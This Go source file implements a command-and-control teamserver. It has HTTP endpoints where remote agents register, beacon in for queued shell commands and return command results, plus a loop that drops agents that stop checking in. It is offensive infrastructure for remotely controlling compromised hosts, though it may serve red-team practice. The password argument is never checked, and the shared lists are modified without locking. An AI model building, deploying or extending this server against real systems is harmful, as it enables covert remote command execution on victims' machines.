package main

import (
	"fmt"
	"math/rand"
	"net/http"
	"os"
	"strconv"
	"time"

	"github.com/gin-gonic/gin"
)

type Agent struct {
	IP       string
	Hostname string
	Sleep    string
	UID      string
}

type Task struct {
	UID       string
	CommandID string
	Command   string
}

type CommandData struct {
	CommandID string
	Command   string
}

type Result struct {
	CommandID string
	Result    string
}

type Callback struct {
	AgentUID     string
	LastCallback int
}

var (
	IP             string
	Port           string
	Password       string
	AgentList      []Agent
	AgentTasks     []Task
	AgentResults   []Result
	AgentCallbacks []Callback
)

func randomString(n int) string {
	letters := []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
	b := make([]rune, n)

	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}

	return string(b)
}

func checkBeacons() {
	for {
		time.Sleep(1 * time.Second)
		for _, callback := range AgentCallbacks {
			for i, agent := range AgentList {
				if agent.UID == callback.AgentUID {
					AgentCallbacks[i].LastCallback = AgentCallbacks[i].LastCallback + 1
					agent_sleep, _ := strconv.Atoi(agent.Sleep)
					agent_buffer := agent_sleep + 5
					fmt.Println("[*] Agent [" + agent.UID + "] last callback: " + strconv.Itoa(callback.LastCallback))
					if callback.LastCallback > agent_buffer {
						fmt.Println("[!] Agent [" + agent.UID + "] has gone offline.")
						AgentList = append(AgentList[:i], AgentList[i+1:]...)
						AgentCallbacks = append(AgentCallbacks[:i], AgentCallbacks[i+1:]...)
					}
				}
			}
		}
	}
}

func registerHTTPListeners(r *gin.Engine) {
	r.GET("/agents", func(c *gin.Context) {
		c.JSON(http.StatusOK, gin.H{
			"agents": AgentList,
		})
	})

	r.GET("/tasks/:uid", func(c *gin.Context) {
		uid := c.Param("uid")
		tasks := []Task{}

		for i, callback := range AgentCallbacks {
			if callback.AgentUID == uid {
				AgentCallbacks = append(AgentCallbacks[:i], AgentCallbacks[i+1:]...)
			}
		}

		AgentCallbacks = append(AgentCallbacks, Callback{AgentUID: uid, LastCallback: 0})

		for _, task := range AgentTasks {
			if task.UID == uid {
				tasks = append(tasks, task)
			}
		}

		if len(tasks) > 0 {
			c.JSON(http.StatusOK, gin.H{
				"tasks": tasks,
			})
			return
		}

		// return nothing
		c.JSON(http.StatusNotFound, gin.H{
			"message": "No tasks found",
		})
	})

	r.POST("/tasks/:uid", func(c *gin.Context) {
		uid := c.Param("uid")
		var command CommandData

		if err := c.BindJSON(&command); err != nil {
			c.JSON(http.StatusBadRequest, gin.H{
				"message": "Invalid JSON",
				"error":   err.Error(),
			})
			return
		}

		for _, agent := range AgentList {
			if agent.UID == uid {

				command_id := randomString(10)
				temp_task := Task{UID: uid, CommandID: command_id, Command: command.Command}

				AgentTasks = append(AgentTasks, temp_task)

				c.JSON(http.StatusOK, gin.H{
					"message": "Task sent successfully",
					"uid":     command_id,
				})
				return
			}
		}

		c.JSON(http.StatusNotFound, gin.H{
			"message": "Agent not found",
		})
	})

	r.POST("/register", func(c *gin.Context) {
		var agent Agent

		if err := c.BindJSON(&agent); err != nil {
			c.JSON(http.StatusBadRequest, gin.H{
				"message": "Invalid JSON",
				"error":   err.Error(),
			})

			return
		}

		agent.UID = randomString(10)
		AgentList = append(AgentList, agent)

		c.JSON(http.StatusOK, gin.H{
			"message": "Agent registered successfully",
			"uid":     agent.UID,
			"sleep":   agent.Sleep,
		})
	})

	r.POST("/results/:uid", func(c *gin.Context) {
		uid := c.Param("uid")
		var result Result
		fmt.Println(c.Request.Body)

		if err := c.BindJSON(&result); err != nil {

			c.JSON(http.StatusBadRequest, gin.H{
				"message": "Invalid JSON",
				"error":   err.Error(),
			})
			return
		}

		if uid != result.CommandID {
			c.JSON(http.StatusBadRequest, gin.H{
				"message": "Invalid command ID",
			})
			return
		}

		for i, task := range AgentTasks {
			if task.CommandID == result.CommandID {
				AgentResults = append(AgentResults, result)
				AgentTasks = append(AgentTasks[:i], AgentTasks[i+1:]...)
				c.JSON(http.StatusOK, gin.H{
					"message": "Result received successfully",
				})

				return
			}
		}
	})

	r.GET("/results/:uid", func(c *gin.Context) {
		uid := c.Param("uid")
		results := []Result{}

		for _, result := range AgentResults {
			if result.CommandID == uid {
				results = append(results, result)
			}
		}

		if len(results) > 0 {
			c.JSON(http.StatusOK, gin.H{
				"results": results,
			})
			return
		}

		c.JSON(http.StatusNotFound, gin.H{
			"message": "No results found",
		})
	})
}

func main() {
	if len(os.Args) == 4 {
		IP, Port, Password = os.Args[1], os.Args[2], os.Args[3]
	} else {
		fmt.Println("Usage: ./teamserver <ip> <port> <password>")
		os.Exit(1)
	}

	//gin.SetMode(gin.ReleaseMode)
	r := gin.Default()

	registerHTTPListeners(r)

	go func() {
		fmt.Println("[*] Teamserver started on [" + IP + ":" + Port + "]")
		r.Run(IP + ":" + Port)
	}()

	go checkBeacons()

	select {}
}
